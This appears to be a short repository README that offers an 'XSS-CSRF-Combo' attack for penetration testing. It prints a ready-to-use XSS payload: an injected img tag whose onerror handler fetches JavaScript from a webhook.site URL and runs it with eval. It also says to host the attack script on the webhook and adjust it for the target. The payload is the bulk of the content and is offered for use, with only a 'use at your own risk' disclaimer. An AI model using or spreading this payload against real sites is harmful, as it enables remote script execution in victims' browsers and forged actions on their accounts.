# XSS-CSRF-Combo
A small useful script combining combined XSS and CSRF to demonstrate real life attack during a penetration testing assessment. Note that I did not develop the script myself.
# Disclaimer : Use at your own risk.

# XSS payload
 "><img src=g onerror="fetch('https://webhook.site/72fb0516-37f4-4597-aec2-a710337bfeef').then(r=>r.text()).then(d=>eval(d))">

 To perform the attack scenario, deploy the javascript content on your webhook. Note that, the content needs to be adjusted based on the target.
